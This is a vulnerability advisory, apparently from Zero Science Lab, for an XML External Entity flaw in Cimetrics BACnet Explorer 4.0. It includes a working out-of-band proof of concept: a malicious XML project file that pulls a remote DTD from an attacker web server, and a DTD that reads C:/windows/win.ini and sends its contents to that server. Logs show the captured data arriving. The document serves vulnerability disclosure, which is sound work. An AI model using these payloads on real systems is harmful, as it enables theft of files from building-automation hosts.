@@ -1,0 +1,55 @@
+Cimetrics BACnet Explorer 4.0 XXE Vulnerability
+
+
+Vendor: Cimetrics, Inc.
+Product web page: https://www.cimetrics.com
+Affected version: 4.0.0.0
+
+Summary: The BACnet Explorer is a BACnet client application that
+helps auto discover BACnet devices.
+
+Desc: BACnetExplorer suffers from an XML External Entity (XXE)
+vulnerability using the DTD parameter entities technique resulting
+in disclosure and retrieval of arbitrary data on the affected node
+via out-of-band (OOB) attack. The vulnerability is triggered when
+input passed to the xml parser is not sanitized while parsing the
+xml project file.
+
+Tested on: Microsoft Windows NT 6.1.7601 Service Pack 1
+           mscorlib.dll: 4.0.30319.34209 built by: FX452RTMGDR
+           BACstac Library: 1.5.6116.0
+           BACstac Service: 6.8.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5398
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5398.php
+
+
+30.01.2017
+
+--
+
+Open file evil.xml:
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE zsl [
+<!ENTITY % remote SYSTEM "http://192.168.1.71:8080/xxe.xml">
+%remote;
+%root;
+%oob;]>
+
+
+xxe.xml on the web server:
+
+<!ENTITY % payload SYSTEM "file:///C:/windows/win.ini">
+<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://192.168.1.71:8080/?%payload;'> ">
+
+
+pyhon -m SimpleHTTPServer 8080
+
+lab-PC - - [30/Jan/2017 00:47:44] "GET /?%5BMail%5D%0D%0ACMCDLLNAME32=mapi32.dll%0D%0ACMC=1%0D%0AMAPI=1%0D%0AMAPIX=1%0D%0AMAPIXVER=1.0.0.1%0D%0AOLEMessaging=1 HTTP/1.1" 301 -
+lab-PC - - [30/Jan/2017 00:47:44] "GET /?%5BMail%5D%0D%0ACMCDLLNAME32=mapi32.dll%0D%0ACMC=1%0D%0AMAPI=1%0D%0AMAPIX=1%0D%0AMAPIXVER=1.0.0.1%0D%0AOLEMessaging=1/ HTTP/1.1" 200 -
